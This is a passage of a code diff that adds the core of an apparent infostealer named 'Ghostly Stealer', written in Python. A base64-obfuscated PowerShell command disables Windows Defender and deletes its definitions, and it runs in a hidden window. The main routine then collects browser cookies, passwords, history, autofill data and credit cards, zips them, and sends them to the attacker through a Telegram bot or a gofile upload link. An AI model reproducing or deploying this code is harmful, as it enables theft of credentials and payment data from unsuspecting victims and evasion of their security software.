+    command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
+    subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+def main():
+    install_missing_libraries()
+    DisableDefender()
+    makedir()
+    capture()
+    GatherAll()
+    folder_path = os.path.join(temp, "Ghostly_" + username)
+    zip_file_name =  os.path.join(local,"Ghostly_" + username)
+    shutil.make_archive(zip_file_name, 'zip', folder_path)
+    shutil.rmtree(folder_path)
+    zip_file_size = os.path.getsize(zip_file_name+".zip") / (1024 * 1024)
+    if zip_file_size < 40:
+            globalinfo = globalInfo()
+            machineinf = machineinfo()
+            phile = os.path.join(local, f"Ghostly_{username}.zip")
+            text = f"Ghostly Stealer Found A New Victim !\n\n{globalinfo}\n{machineinf}🌐Cookies Found: {CookiCount}\n🌐Passwords Found: {PassCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}"
+            bot.send_document(chat_id=chatyd, document=open(phile, 'rb'),caption=text)
+            os.remove(phile)
+    else:
+        link = upload_to_gofile(zip_file_name+".zip")
+        if link:
+            send_telegram_message(link)
+            os.remove(phile)
+if __name__ == "__main__":
+    main()
